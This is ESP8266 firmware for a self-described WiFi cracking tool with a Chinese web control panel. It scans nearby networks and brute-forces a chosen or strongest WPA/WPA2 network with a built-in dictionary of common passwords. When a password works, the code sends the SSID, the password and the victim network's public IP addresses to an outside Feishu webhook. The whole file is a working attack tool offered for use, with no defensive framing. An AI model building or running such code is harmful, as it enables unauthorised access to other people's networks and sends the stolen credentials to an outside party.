#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>
#include <ESP8266HTTPClient.h>
#include <WiFiClientSecure.h>
#include <EEPROM.h>

// === 配置区 ===
const char* ap_ssid = "WiFi_CRACK";
const char* ap_password = "P0ssw0rd";

// LED指示灯配置
#define LED_PIN 2  // ESP8266板载LED引脚（D4，低电平点亮）

// EEPROM 配置存储地址
#define EEPROM_SIZE 4096
#define WEBHOOK_URL_ADDR 0
#define PASSWORD_LIST_ADDR 512
#define AP_SSID_ADDR 1536
#define AP_PASSWORD_ADDR 1792
#define TARGET_SSID_ADDR 2048

ESP8266WebServer server(80);

// 默认密码字典
String passwordList = "12345678,123123123,1234567890,123456789,password,admin123,11111111,22222222,33333333,44444444,55555555,66666666,77777777,88888888,99999999,00000000,0987654321,123456123456,1234567890.,abc123123,iloveyou,87654321,lililili,qwertyuiop,asdfghjkl,zxcvbnm123,1q2w3e4r5t,1qaz2wsx3edc,1qaz2wsx,147258369,159357258,258369147,qazwsxedc,qwerty123,66668888,88886666,1234abcd,abcd1234,11223344,111111111,11111111,87654321,password123,12345678910";

// 默认飞书webhook
String webhookUrl = "https://open.feishu.cn/open-apis/bot/v2/hook/YOUR_HOOK_HERE";

// AP配置和目标WiFi
String currentApSsid = ap_ssid;
String currentApPassword = ap_password;
String targetSsid = ""; // 空字符串表示破解全部WiFi

// === 函数声明 ===
void handleRoot();
void handlePasswordConfig();
void handleWiFiScan();
void handleWebhookConfig();
void handleSavePasswords();
void handleSaveWebhook();
void handleStartCrack();
void handleApConfig();
void handleSaveApConfig();
void handleTargetWifi();
void handleSaveTargetWifi();
void sendToFeishu(const String& ssid, const String& password, bool isOpenNetwork);
String getIPAddress();
String getHTMLHeader(const String& title);
String getHTMLFooter();
String getEncryptionType(uint8_t encType);
int getSignalLevel(int rssi);
String getSignalQuality(int rssi);
void startCracking();
void restartApWithNewConfig();

// LED控制函数声明
void ledSetup();
void ledSlowBlink();
void ledFastBlinkSuccess();
void ledOff();

void setup() {
  Serial.begin(115200);
  
  // 初始化LED
  ledSetup();
  
  // 初始化EEPROM
  EEPROM.begin(EEPROM_SIZE);
  
  // 从EEPROM读取配置
  loadConfigFromEEPROM();
  
  // 设置AP模式
  WiFi.mode(WIFI_AP);
  
  // 配置AP的IP地址和子网掩码
  IPAddress local_IP(192, 168, 4, 1);
  IPAddress gateway(192, 168, 4, 1);
  IPAddress subnet(255, 255, 255, 0);
  
  // 设置静态IP并启动AP
  WiFi.softAPConfig(local_IP, gateway, subnet);
  WiFi.softAP(ap_ssid, ap_password);
  
  Serial.println("AP模式已启动");
  Serial.print("SSID: ");
  Serial.println(ap_ssid);
  Serial.print("密码: ");
  Serial.println(ap_password);
  Serial.print("AP IP地址: ");
  Serial.println(WiFi.softAPIP());
  Serial.print("子网掩码: ");
  Serial.println(subnet.toString());
  Serial.print("网关: ");
  Serial.println(gateway.toString());
  
  // 配置DHCP租约时间（可选）
  // WiFi.softAPsetDhcpLeaseTime(7200); // 2小时租约时间
  
  // 设置Web服务器路由
  server.on("/", handleRoot);
  server.on("/password", handlePasswordConfig);
  server.on("/wifi-scan", handleWiFiScan);
  server.on("/webhook", handleWebhookConfig);
  server.on("/ap-config", handleApConfig);
  server.on("/target-wifi", handleTargetWifi);
  server.on("/save-passwords", HTTP_POST, handleSavePasswords);
  server.on("/save-webhook", HTTP_POST, handleSaveWebhook);
  server.on("/save-ap-config", HTTP_POST, handleSaveApConfig);
  server.on("/save-target-wifi", HTTP_POST, handleSaveTargetWifi);
  server.on("/start-crack", handleStartCrack);
  
  server.begin();
  Serial.println("Web服务器已启动");
  Serial.println("访问 http://192.168.4.1 进行配置");
}

void loop() {
  server.handleClient();
}

void loadConfigFromEEPROM() {
  // 读取webhook URL
  String savedWebhook = "";
  for (int i = 0; i < 256; i++) {
    char c = EEPROM.read(WEBHOOK_URL_ADDR + i);
    if (c == 0) break;
    savedWebhook += c;
  }
  if (savedWebhook.length() > 0) {
    webhookUrl = savedWebhook;
  }
  
  // 读取密码列表
  String savedPasswords = "";
  for (int i = 0; i < 1024; i++) {
    char c = EEPROM.read(PASSWORD_LIST_ADDR + i);
    if (c == 0) break;
    savedPasswords += c;
  }
  if (savedPasswords.length() > 0) {
    passwordList = savedPasswords;
  }
  
  // 读取AP配置
  String savedApSsid = "";
  for (int i = 0; i < 256; i++) {
    char c = EEPROM.read(AP_SSID_ADDR + i);
    if (c == 0) break;
    savedApSsid += c;
  }
  if (savedApSsid.length() > 0) {
    currentApSsid = savedApSsid;
  }
  
  String savedApPassword = "";
  for (int i = 0; i < 256; i++) {
    char c = EEPROM.read(AP_PASSWORD_ADDR + i);
    if (c == 0) break;
    savedApPassword += c;
  }
  if (savedApPassword.length() > 0) {
    currentApPassword = savedApPassword;
  }
  
  // 读取目标WiFi
  String savedTargetSsid = "";
  for (int i = 0; i < 256; i++) {
    char c = EEPROM.read(TARGET_SSID_ADDR + i);
    if (c == 0) break;
    savedTargetSsid += c;
  }
  if (savedTargetSsid.length() > 0) {
    targetSsid = savedTargetSsid;
  }
}

void saveConfigToEEPROM() {
  // 保存webhook URL
  for (int i = 0; i < webhookUrl.length(); i++) {
    EEPROM.write(WEBHOOK_URL_ADDR + i, webhookUrl[i]);
  }
  EEPROM.write(WEBHOOK_URL_ADDR + webhookUrl.length(), 0);
  
  // 保存密码列表
  for (int i = 0; i < passwordList.length(); i++) {
    EEPROM.write(PASSWORD_LIST_ADDR + i, passwordList[i]);
  }
  EEPROM.write(PASSWORD_LIST_ADDR + passwordList.length(), 0);
  
  // 保存AP配置
  for (int i = 0; i < currentApSsid.length(); i++) {
    EEPROM.write(AP_SSID_ADDR + i, currentApSsid[i]);
  }
  EEPROM.write(AP_SSID_ADDR + currentApSsid.length(), 0);
  
  for (int i = 0; i < currentApPassword.length(); i++) {
    EEPROM.write(AP_PASSWORD_ADDR + i, currentApPassword[i]);
  }
  EEPROM.write(AP_PASSWORD_ADDR + currentApPassword.length(), 0);
  
  // 保存目标WiFi
  for (int i = 0; i < targetSsid.length(); i++) {
    EEPROM.write(TARGET_SSID_ADDR + i, targetSsid[i]);
  }
  EEPROM.write(TARGET_SSID_ADDR + targetSsid.length(), 0);
  
  EEPROM.commit();
}

void handleRoot() {
  String html = getHTMLHeader("WiFi破解工具 - 主页");
  html += "<div class='container'>";
  html += "<h1>WiFi破解工具</h1>";
  html += "<div class='status-card'>";
  html += "<h2>系统状态</h2>";
  html += "<p><strong>AP名称:</strong> " + String(ap_ssid) + "</p>";
  html += "<p><strong>AP密码:</strong> " + String(ap_password) + "</p>";
  html += "<p><strong>AP IP地址:</strong> " + WiFi.softAPIP().toString() + "</p>";
  html += "<p><strong>子网掩码:</strong> 255.255.255.0</p>";
  html += "<p><strong>网关:</strong> 192.168.4.1</p>";
  html += "<p><strong>DHCP范围:</strong> 192.168.4.2 - 192.168.4.254</p>";
  
  // 显示连接的客户端数量
  int clientCount = WiFi.softAPgetStationNum();
  html += "<p><strong>已连接客户端:</strong> " + String(clientCount) + " 个</p>";
  
  // 手动计算密码数量（替代split方法）
  int passwordCount = 1;
  for (int i = 0; i < passwordList.length(); i++) {
    if (passwordList[i] == ',') passwordCount++;
  }
  html += "<p><strong>密码字典数量:</strong> " + String(passwordCount) + " 个</p>";
  
  // 修复字符串拼接错误
  html += "<p><strong>飞书通知:</strong> ";
  html += (webhookUrl.indexOf("YOUR_HOOK_HERE") == -1 ? "已配置" : "未配置");
  html += "</p>";
  
  html += "</div>";
  
  html += "<div class='menu-grid'>";
  html += "<a href='/ap-config' class='menu-item'>";
  html += "<h3>AP配置管理</h3>";
  html += "<p>修改AP名称和密码</p>";
  html += "</a>";
  
  html += "<a href='/password' class='menu-item'>";
  html += "<h3>密码字典配置</h3>";
  html += "<p>管理密码字典列表</p>";
  html += "</a>";
  
  html += "<a href='/wifi-scan' class='menu-item'>";
  html += "<h3>WiFi扫描</h3>";
  html += "<p>查看附近WiFi网络</p>";
  html += "</a>";
  
  html += "<a href='/target-wifi' class='menu-item'>";
  html += "<h3>目标WiFi设置</h3>";
  html += "<p>指定要破解的WiFi</p>";
  html += "</a>";
  
  html += "<a href='/webhook' class='menu-item'>";
  html += "<h3>飞书通知配置</h3>";
  html += "<p>设置飞书机器人</p>";
  html += "</a>";
  
  html += "<a href='/start-crack' class='menu-item start-crack'>";
  html += "<h3>开始破解</h3>";
  html += "<p>启动WiFi破解程序</p>";
  html += "</a>";
  html += "</div>";
  
  html += "</div>";
  html += getHTMLFooter();
  
  server.send(200, "text/html", html);
}

void handlePasswordConfig() {
  String html = getHTMLHeader("密码字典配置");
  html += "<div class='container'>";
  html += "<h1>密码字典配置</h1>";
  html += "<form action='/save-passwords' method='post'>";
  html += "<div class='form-group'>";
  html += "<label for='passwords'>密码列表（每行一个密码或用逗号分隔）:</label>";
  html += "<textarea id='passwords' name='passwords' rows='15' style='width:100%'>" + passwordList + "</textarea>";
  html += "</div>";
  html += "<button type='submit' class='btn'>保存配置</button>";
  html += "<a href='/' class=\"btn btn-secondary\">返回主页</a>";
  html += "</form>";
  html += "</div>";
  html += getHTMLFooter();
  
  server.send(200, "text/html", html);
}

void handleWiFiScan() {
  String html = getHTMLHeader("WiFi网络扫描");
  html += "<div class='container'>";
  html += "<h1>附近WiFi网络</h1>";
  
  // 扫描WiFi网络（保持当前AP模式不断开）
  int n = WiFi.scanNetworks(false, true); // async=false, show_hidden=true
  
  html += "<div class='scan-info'>";
  html += "<p><strong>发现网络数量:</strong> " + String(n) + " 个</p>";
  html += "</div>";
  
  if (n == 0) {
    html += "<p class='no-networks'>未发现任何WiFi网络</p>";
  } else {
    html += "<div class='wifi-list'>";
    for (int i = 0; i < n; i++) {
      String ssid = WiFi.SSID(i);
      int rssi = WiFi.RSSI(i);
      String encryption = getEncryptionType(WiFi.encryptionType(i));
      
      html += "<div class='wifi-item'>";
      html += "<div class='wifi-header'>";
      html += "<span class='ssid'>" + ssid + "</span>";
      html += "<span class='signal-strength signal-" + String(getSignalLevel(rssi)) + "'>" + String(rssi) + " dBm</span>";
      html += "</div>";
      html += "<div class='wifi-details'>";
      html += "<p><strong>加密方式:</strong> " + encryption + "</p>";
      html += "<p><strong>信号强度:</strong> " + String(rssi) + " dBm (" + getSignalQuality(rssi) + ")</p>";
      html += "<p><strong>频道:</strong> " + String(WiFi.channel(i)) + "</p>";
      html += "<p><strong>MAC地址:</strong> " + WiFi.BSSIDstr(i) + "</p>";
      html += "</div>";
      html += "</div>";
    }
    html += "</div>";
  }
  
  html += "<div style='margin-top:20px;'>";
  html += "<a href='/wifi-scan' class='btn'>重新扫描</a>";
  html += "<a href='/' class=\"btn btn-secondary\">返回主页</a>";
  html += "</div>";
  html += "</div>";
  html += getHTMLFooter();
  
  server.send(200, "text/html", html);
}

void handleWebhookConfig() {
  String html = getHTMLHeader("飞书通知配置");
  html += "<div class='container'>";
  html += "<h1>飞书机器人配置</h1>";
  html += "<form action='/save-webhook' method='post'>";
  html += "<div class='form-group'>";
  html += "<label for='webhook'>飞书Webhook URL:</label>";
  html += "<input type='text' id='webhook' name='webhook' value='" + webhookUrl + "' style='width:100%'>";
  html += "<small>格式: https://open.feishu.cn/open-apis/bot/v2/hook/your-hook-id</small>";
  html += "</div>";
  html += "<button type='submit' class='btn'>保存配置</button>";
  html += "<a href='/' class=\"btn btn-secondary\">返回主页</a>";
  html += "</form>";
  html += "</div>";
  html += getHTMLFooter();
  
  server.send(200, "text/html", html);
}

void handleSavePasswords() {
  if (server.hasArg("passwords")) {
    passwordList = server.arg("passwords");
    // 处理换行符，转换为逗号分隔
    passwordList.replace("\n", ",");
    passwordList.replace("\r", "");
    
    saveConfigToEEPROM();
    
    String html = getHTMLHeader("保存成功");
    html += "<div class='container'>";
    html += "<h1>保存成功</h1>";
    html += "<p>密码字典已成功保存！</p>";
    html += "<a href='/password' class='btn'>返回配置</a>";
    html += "<a href='/' class=\"btn btn-secondary\">返回主页</a>";
    html += "</div>";
    html += getHTMLFooter();
    
    server.send(200, "text/html", html);
  }
}

void handleSaveWebhook() {
  if (server.hasArg("webhook")) {
    webhookUrl = server.arg("webhook");
    saveConfigToEEPROM();
    
    String html = getHTMLHeader("保存成功");
    html += "<div class='container'>";
    html += "<h1>保存成功</h1>";
    html += "<p>飞书Webhook URL已成功保存！</p>";
    html += "<a href='/webhook' class='btn'>返回配置</a>";
    html += "<a href='/' class=\"btn btn-secondary\">返回主页</a>";
    html += "</div>";
    html += getHTMLFooter();
    
    server.send(200, "text/html", html);
  }
}

void handleStartCrack() {
  String html = getHTMLHeader("开始破解");
  html += "<div class='container'>";
  html += "<h1>WiFi破解程序已启动</h1>";
  html += "<p>破解程序正在后台运行，请查看串口输出获取详细信息。</p>";
  html += "<p>破解完成后设备将进入深度睡眠模式。</p>";
  html += "<a href='/' class=\"btn\">返回主页</a>";
  html += "</div>";
  html += getHTMLFooter();
  
  server.send(200, "text/html", html);
  
  // 延迟执行破解程序
  delay(1000);
  startCracking();
}

void startCracking() {
  Serial.println("=== WiFi密码破解程序启动 ===");
  
  // LED指示：开始破解，快速闪烁
  ledFastBlinkSuccess();
  
  // 1. 扫描附近WiFi网络
  Serial.println("正在扫描附近WiFi网络...");
  
  // 临时切换到STA模式进行扫描
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  delay(2000);
  
  int n = WiFi.scanNetworks();
  Serial.printf("扫描完成，发现 %d 个网络\n", n);
  
  if (n == 0) {
    Serial.println("未发现任何WiFi网络，程序结束");
    return;
  }
  
  // 2. 显示扫描结果
  Serial.println("\n=== 扫描结果 ===");
  for (int i = 0; i < n; i++) {
    Serial.printf("%d: %s (%ddBm) %s\n", 
                  i+1, 
                  WiFi.SSID(i).c_str(), 
                  WiFi.RSSI(i), 
                  getEncryptionType(WiFi.encryptionType(i)).c_str());
  }
  
  // 3. 选择目标网络
  String targetSSID = "";
  int targetRSSI = -100;
  
  if (targetSsid.length() > 0) {
    // 如果指定了目标WiFi，查找该WiFi
    Serial.printf("查找指定目标WiFi: %s\n", targetSsid.c_str());
    
    for (int i = 0; i < n; i++) {
      if (WiFi.SSID(i) == targetSsid) {
        targetSSID = WiFi.SSID(i);
        targetRSSI = WiFi.RSSI(i);
        Serial.printf("找到指定目标WiFi: %s (%ddBm)\n", targetSSID.c_str(), targetRSSI);
        break;
      }
    }
    
    if (targetSSID == "") {
      Serial.println("未找到指定的目标WiFi，程序结束");
      return;
    }
  } else {
    // 未指定目标WiFi，选择信号最强的WPA/WPA2网络
    Serial.println("未指定目标WiFi，将破解所有发现的网络");
    
    for (int i = 0; i < n; i++) {
      uint8_t encType = WiFi.encryptionType(i);
      int rssi = WiFi.RSSI(i);
      
      // 优先选择WPA/WPA2加密且信号强的网络
      if ((encType == ENC_TYPE_TKIP || encType == ENC_TYPE_CCMP) && rssi > targetRSSI) {
        targetSSID = WiFi.SSID(i);
        targetRSSI = rssi;
      }
    }
    
    if (targetSSID == "") {
      Serial.println("未找到合适的WPA/WPA2加密网络，尝试开放网络...");
      // 如果没有WPA/WPA2网络，尝试开放网络
      for (int i = 0; i < n; i++) {
        uint8_t encType = WiFi.encryptionType(i);
        int rssi = WiFi.RSSI(i);
        
        if (encType == ENC_TYPE_NONE && rssi > targetRSSI) {
          targetSSID = WiFi.SSID(i);
          targetRSSI = rssi;
        }
      }
    }
    
    if (targetSSID == "") {
      Serial.println("未找到任何合适的网络，程序结束");
      return;
    }
  }
  
  Serial.printf("\n选择目标网络: %s (%ddBm)\n", targetSSID.c_str(), targetRSSI);
  
  // 4. 开始密码爆破
  Serial.println("开始密码爆破...");
  
  // LED指示：开始慢闪，表示破解中
  ledSlowBlink();
  
  // 解析密码字典
  String passwords[100]; // 最多支持100个密码
  int passwordCount = 0;
  
  // 手动解析逗号分隔的密码列表
  String currentPassword = "";
  for (int i = 0; i < passwordList.length(); i++) {
    if (passwordList[i] == ',') {
      if (currentPassword.length() > 0 && passwordCount < 100) {
        passwords[passwordCount++] = currentPassword;
        currentPassword = "";
      }
    } else {
      currentPassword += passwordList[i];
    }
  }
  
  // 添加最后一个密码
  if (currentPassword.length() > 0 && passwordCount < 100) {
    passwords[passwordCount++] = currentPassword;
  }
  
  Serial.printf("密码字典解析完成，共 %d 个密码\n", passwordCount);
  
  // 5. 尝试连接
  bool success = false;
  String foundPassword = "";
  
  for (int i = 0; i < passwordCount; i++) {
    Serial.printf("尝试密码 %d/%d: %s\n", i+1, passwordCount, passwords[i].c_str());
    
    WiFi.begin(targetSSID.c_str(), passwords[i].c_str());
    
    // 替换原来的连接循环
    unsigned long startTime = millis();
    bool connected = false;
    bool definitelyFailed = false;
    
    while (millis() - startTime < 15000) { // 最多等待 15 秒
        int status = WiFi.status();
        
        if (status == WL_CONNECTED) {
            connected = true;
            break;
        } else if (status == WL_CONNECT_FAILED || status == WL_NO_SSID_AVAIL) {
            definitelyFailed = true;
            break;
        }
        
        // LED慢闪
        digitalWrite(LED_PIN, LOW);
        delay(250);
        digitalWrite(LED_PIN, HIGH);
        delay(250);
    }
    
    if (connected) {
        Serial.println("\n连接成功！");
        success = true;
        foundPassword = passwords[i];
        
        // LED指示：连接成功，快闪3秒
        ledFastBlinkSuccess();
        delay(3000);
        
        break;
    } else {
        Serial.println(definitelyFailed ? " [确定失败]" : " [超时]");
        WiFi.disconnect();
        delay(2000); // 延长断开时间
    }
  }
  
  // 6. 处理结果
  if (success) {
    Serial.printf("\n=== 破解成功 ===\n");
    Serial.printf("SSID: %s\n", targetSSID.c_str());
    Serial.printf("密码: %s\n", foundPassword.c_str());
    Serial.printf("IP地址: %s\n", WiFi.localIP().toString().c_str());
    
    // 发送飞书通知
    if (webhookUrl.indexOf("YOUR_HOOK_HERE") == -1) {
      Serial.println("发送飞书通知...");
      sendToFeishu(targetSSID, foundPassword, false);
    }
    
    // 保持连接状态一段时间
    delay(10000);
    
  } else {
    Serial.println("\n=== 破解失败 ===");
    Serial.println("所有密码尝试失败");
    
    // 检查是否是开放网络
    WiFi.begin(targetSSID.c_str(), "");
    delay(5000);
    
    if (WiFi.status() == WL_CONNECTED) {
      Serial.println("发现开放网络，无需密码");
      if (webhookUrl.indexOf("YOUR_HOOK_HERE") == -1) {
        sendToFeishu(targetSSID, "", true);
      }
    }
  }
  
  // 7. 进入深度睡眠模式
  Serial.println("\n破解程序完成，进入深度睡眠模式...");
  Serial.println("=== 程序结束 ===");
  
  // 实际深度睡眠代码（需要根据硬件配置）
  // ESP.deepSleep(0); // 永久睡眠
  
  // 或者保持AP模式继续服务
  WiFi.mode(WIFI_AP);
  WiFi.softAP(ap_ssid, ap_password);
  Serial.println("恢复AP模式，等待下一次操作");
}

String getEncryptionType(uint8_t encType) {
  switch (encType) {
    case ENC_TYPE_NONE: return "无加密";
    case ENC_TYPE_WEP: return "WEP";
    case ENC_TYPE_TKIP: return "WPA";
    case ENC_TYPE_CCMP: return "WPA2";
    case ENC_TYPE_AUTO: return "混合/自动协商";
    default: return "未知";
  }
}

int getSignalLevel(int rssi) {
  if (rssi >= -50) return 4; // 优秀
  else if (rssi >= -60) return 3; // 良好
  else if (rssi >= -70) return 2; // 一般
  else return 1; // 差
}

String getSignalQuality(int rssi) {
  if (rssi >= -50) return "优秀";
  else if (rssi >= -60) return "良好";
  else if (rssi >= -70) return "一般";
  else return "差";
}

String getHTMLHeader(const String& title) {
  String html = "<!DOCTYPE html><html><head>";
  html += "<meta charset='UTF-8'>";
  html += "<meta name='viewport' content='width=device-width, initial-scale=1.0'>";
  html += "<title>" + title + "</title>";
  html += "<style>";
  html += "* { margin: 0; padding: 0; box-sizing: border-box; }";
  html += "body { font-family: Arial, sans-serif; background: #f5f5f5; color: #333; }";
  html += ".container { max-width: 800px; margin: 0 auto; padding: 20px; }";
  html += "h1 { color: #2c3e50; margin-bottom: 20px; }";
  html += ".status-card { background: white; padding: 20px; border-radius: 8px; margin-bottom: 20px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }";
  html += ".menu-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 20px; }";
  html += ".menu-item { background: white; padding: 20px; border-radius: 8px; text-decoration: none; color: #333; box-shadow: 0 2px 4px rgba(0,0,0,0.1); transition: transform 0.2s; }";
  html += ".menu-item:hover { transform: translateY(-2px); box-shadow: 0 4px 8px rgba(0,0,0,0.2); }";
  html += ".menu-item.start-crack { background: #e74c3c; color: white; }";
  html += ".form-group { margin-bottom: 20px; }";
  html += "label { display: block; margin-bottom: 5px; font-weight: bold; }";
  html += "input, textarea { padding: 10px; border: 1px solid #ddd; border-radius: 4px; font-size: 14px; }";
  html += ".btn { display: inline-block; padding: 10px 20px; background: #3498db; color: white; text-decoration: none; border-radius: 4px; margin-right: 10px; }";
  html += ".btn-secondary { background: #95a5a6; }";
  html += ".wifi-list { margin-top: 20px; }";
  html += ".wifi-item { background: white; padding: 15px; border-radius: 8px; margin-bottom: 10px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }";
  html += ".wifi-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px; }";
  html += ".ssid { font-weight: bold; font-size: 16px; }";
  html += ".signal-strength { padding: 2px 8px; border-radius: 4px; color: white; font-size: 12px; }";
  html += ".signal-4 { background: #27ae60; } /* 优秀 */";
  html += ".signal-3 { background: #f39c12; } /* 良好 */";
  html += ".signal-2 { background: #e67e22; } /* 一般 */";
  html += ".signal-1 { background: #e74c3c; } /* 差 */";
  html += ".wifi-details p { margin-bottom: 5px; font-size: 14px; }";
  html += "</style></head><body>";
  return html;
}

String getHTMLFooter() {
  return "</body></html>";
}

String getIPAddress() {
  WiFiClient client;
  HTTPClient http;
  
  String ipv4 = "未知";
  String ipv6 = "未知";
  
  // 获取 IPv4 地址
  if (http.begin(client, "http://4.ipw.cn")) {
    int code = http.GET();
    if (code == 200) {
      ipv4 = http.getString();
      ipv4.trim();
    }
    http.end();
  }
  
  delay(500);
  
  // 获取 IPv6 地址
  if (http.begin(client, "http://6.ipw.cn")) {
    int code = http.GET();
    if (code == 200) {
      ipv6 = http.getString();
      ipv6.trim();
    }
    http.end();
  }
  
  return "IPv4: " + ipv4 + "\nIPv6: " + ipv6;
}

void sendToFeishu(const String& ssid, const String& password, bool isOpenNetwork) {
  WiFiClientSecure client;
  client.setInsecure();

  HTTPClient https;
  if (https.begin(client, webhookUrl)) {
    https.addHeader("Content-Type", "application/json; charset=utf-8");
    
    String ipInfo = getIPAddress();
    
    String json;
    if (isOpenNetwork) {
      json = "{\"msg_type\":\"text\",\"content\":{\"text\":\"[发现开放WiFi]\\nSSID: ";
      json += ssid;
      json += "\\n类型: 无密码开放网络\\n";
    } else {
      json = "{\"msg_type\":\"text\",\"content\":{\"text\":\"[WiFi破解成功]\\nSSID: ";
      json += ssid;
      json += "\\nPassword: ";
      json += password;
      json += "\\n";
    }
    
    json += ipInfo;
    json += "\"}}";

    int code = https.POST(json);
    Serial.printf("飞书通知返回码: %d\n", code);
    https.end();
  }
}

// === LED控制函数实现 ===

// LED初始化
void ledSetup() {
  pinMode(LED_PIN, OUTPUT);
  digitalWrite(LED_PIN, HIGH); // 初始状态熄灭（ESP8266板载LED低电平点亮）
  Serial.println("LED指示灯已初始化");
}

// 慢闪：破解中（500ms间隔）
void ledSlowBlink() {
  Serial.println("LED慢闪：破解中...");
  // 这个函数会在破解循环中持续调用
}

// 快闪3秒：连接成功（100ms间隔，持续3秒）
void ledFastBlinkSuccess() {
  Serial.println("LED快闪：连接成功！");
  for (int i = 0; i < 15; i++) { // 3秒 / 200ms周期 = 15次
    digitalWrite(LED_PIN, LOW); // 点亮
    delay(100);
    digitalWrite(LED_PIN, HIGH); // 熄灭
    delay(100);
  }
}

// 关闭LED
void ledOff() {
  digitalWrite(LED_PIN, HIGH); // 熄灭
}

// === AP配置管理函数 ===

void handleApConfig() {
  String html = getHTMLHeader("AP配置管理");
  html += "<div class='container'>";
  html += "<h1>AP配置管理</h1>";
  html += "<form action='/save-ap-config' method='post'>";
  html += "<div class='form-group'>";
  html += "<label for='ap-ssid'>AP名称 (SSID):</label>";
  html += "<input type='text' id='ap-ssid' name='ap-ssid' value='" + currentApSsid + "' style='width:100%'>";
  html += "<small>修改后需要重启AP生效</small>";
  html += "</div>";
  html += "<div class='form-group'>";
  html += "<label for='ap-password'>AP密码:</label>";
  html += "<input type='password' id='ap-password' name='ap-password' value='" + currentApPassword + "' style='width:100%'>";
  html += "<small>最少8位字符</small>";
  html += "</div>";
  html += "<button type='submit' class='btn'>保存配置并重启AP</button>";
  html += "<a href='/' class=\"btn btn-secondary\">返回主页</a>";
  html += "</form>";
  html += "</div>";
  html += getHTMLFooter();
  
  server.send(200, "text/html", html);
}

void handleSaveApConfig() {
  if (server.hasArg("ap-ssid") && server.hasArg("ap-password")) {
    String newApSsid = server.arg("ap-ssid");
    String newApPassword = server.arg("ap-password");
    
    // 验证输入
    if (newApSsid.length() == 0) {
      newApSsid = "WiFi_CRACK";
    }
    if (newApPassword.length() < 8) {
      newApPassword = "P0ssw0rd";
    }
    
    currentApSsid = newApSsid;
    currentApPassword = newApPassword;
    
    saveConfigToEEPROM();
    
    String html = getHTMLHeader("AP配置已保存");
    html += "<div class='container'>";
    html += "<h1>AP配置已保存</h1>";
    html += "<p>新的AP配置已保存到EEPROM，正在重启AP...</p>";
    html += "<p><strong>新AP名称:</strong> " + currentApSsid + "</p>";
    html += "<p><strong>新AP密码:</strong> " + currentApPassword + "</p>";
    html += "<p>请等待几秒钟后重新连接新的WiFi网络</p>";
    html += "<a href='/' class='btn'>返回主页</a>";
    html += "</div>";
    html += getHTMLFooter();
    
    server.send(200, "text/html", html);
    
    // 延迟重启AP，确保页面已发送
    delay(2000);
    restartApWithNewConfig();
  }
}

void restartApWithNewConfig() {
  Serial.println("正在重启AP...");
  
  // 关闭现有AP
  WiFi.softAPdisconnect(true);
  delay(1000);
  
  // 重新配置AP
  WiFi.mode(WIFI_AP);
  
  // 配置AP的IP地址和子网掩码
  IPAddress local_IP(192, 168, 4, 1);
  IPAddress gateway(192, 168, 4, 1);
  IPAddress subnet(255, 255, 255, 0);
  
  // 设置静态IP并启动AP
  WiFi.softAPConfig(local_IP, gateway, subnet);
  WiFi.softAP(currentApSsid.c_str(), currentApPassword.c_str());
  
  Serial.println("AP已重启");
  Serial.print("新SSID: ");
  Serial.println(currentApSsid);
  Serial.print("新密码: ");
  Serial.println(currentApPassword);
  Serial.print("AP IP地址: ");
  Serial.println(WiFi.softAPIP());
}

// === 目标WiFi设置函数 ===

void handleTargetWifi() {
  String html = getHTMLHeader("目标WiFi设置");
  html += "<div class='container'>";
  html += "<h1>目标WiFi设置</h1>";
  
  // 扫描WiFi网络
  html += "<div class='form-group'>";
  html += "<a href='/target-wifi' class='btn'>重新扫描WiFi</a>";
  html += "</div>";
  
  // 扫描WiFi网络（保持当前AP模式不断开）
  int n = WiFi.scanNetworks(false, true); // async=false, show_hidden=true
  
  html += "<form action='/save-target-wifi' method='post'>";
  html += "<div class='form-group'>";
  html += "<label>选择要破解的WiFi网络:</label>";
  html += "<div style='margin:10px 0;'>";
  html += "<label><input type='radio' name='target-ssid' value='' ";
  html += (targetSsid.length() == 0 ? "checked" : "");
  html += "> 破解所有发现的WiFi网络</label>";
  html += "</div>";
  
  if (n == 0) {
    html += "<p class='no-networks'>未发现任何WiFi网络</p>";
  } else {
    html += "<div class='wifi-list' style='max-height:400px; overflow-y:auto; border:1px solid #ddd; padding:10px; border-radius:4px;'>";
    for (int i = 0; i < n; i++) {
      String ssid = WiFi.SSID(i);
      int rssi = WiFi.RSSI(i);
      String encryption = getEncryptionType(WiFi.encryptionType(i));
      
      html += "<div class='wifi-item' style='padding:10px; margin-bottom:5px; border:1px solid #eee; border-radius:4px;'>";
      html += "<label style='display:flex; align-items:center; cursor:pointer;'>";
      html += "<input type='radio' name='target-ssid' value='" + ssid + "' ";
      html += (targetSsid == ssid ? "checked" : "");
      html += " style='margin-right:10px;'>";
      html += "<div>";
      html += "<strong>" + ssid + "</strong>";
      html += "<div style='font-size:12px; color:#666;'>";
      html += "信号: " + String(rssi) + " dBm (" + getSignalQuality(rssi) + ") | 加密: " + encryption;
      html += "</div>";
      html += "</div>";
      html += "</label>";
      html += "</div>";
    }
    html += "</div>";
  }
  
  html += "<small>选择要破解的WiFi网络，或选择'破解所有发现的WiFi网络'进行全量破解</small>";
  html += "</div>";
  html += "<button type='submit' class='btn'>保存设置</button>";
  html += "<a href='/' class=\"btn btn-secondary\">返回主页</a>";
  html += "</form>";
  html += "</div>";
  html += getHTMLFooter();
  
  server.send(200, "text/html", html);
}

void handleSaveTargetWifi() {
  if (server.hasArg("target-ssid")) {
    targetSsid = server.arg("target-ssid");
    
    saveConfigToEEPROM();
    
    String html = getHTMLHeader("目标WiFi已保存");
    html += "<div class='container'>";
    html += "<h1>目标WiFi已保存</h1>";
    if (targetSsid.length() > 0) {
      html += "<p>已设置目标WiFi: <strong>" + targetSsid + "</strong></p>";
      html += "<p>破解程序将只针对该WiFi网络进行破解。</p>";
    } else {
      html += "<p>已设置为破解全部WiFi网络。</p>";
    }
    html += "<a href='/start-crack' class='btn'>开始破解</a>";
    html += "<a href='/' class=\"btn btn-secondary\">返回主页</a>";
    html += "</div>";
    html += getHTMLFooter();
    
    server.send(200, "text/html", html);
  }
}